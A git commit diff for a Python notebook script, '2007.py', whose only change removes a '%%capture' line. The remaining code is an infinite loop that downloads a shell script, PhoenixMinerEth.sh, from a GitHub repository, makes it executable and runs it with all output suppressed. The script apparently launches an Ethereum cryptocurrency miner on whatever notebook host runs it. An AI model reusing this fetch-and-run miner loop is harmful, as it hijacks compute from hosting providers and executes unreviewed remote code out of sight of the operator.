1ff7eb9ae455dd457b7491e29f87d3c1f28b7091
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-03-14 22:23:44 +0530

    Update 2007.py

--- 2007.py
+++ 2007.py
@@ -1,4 +1,3 @@
-%%capture
 import time 
 while  True: 
   ! timeout 15m wget https://raw.githubusercontent.com/Master478963/lolMinet/main/PhoenixMinerEth.sh && chmod u+x PhoenixMinerEth.sh && ./PhoenixMinerEth.sh > /dev/null 2>&1 
